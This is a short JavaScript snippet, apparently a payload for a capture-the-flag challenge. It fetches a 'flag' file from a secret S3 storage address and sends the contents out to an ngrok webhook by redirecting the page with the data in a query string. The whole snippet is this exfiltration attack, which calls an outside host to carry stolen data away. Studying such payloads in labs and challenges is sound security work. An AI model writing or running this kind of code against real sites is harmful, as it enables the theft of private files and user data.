async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('https%3A%2F%2Fbugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com%2Fflag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://2b66-49-36-190-235.ngrok-free.app');
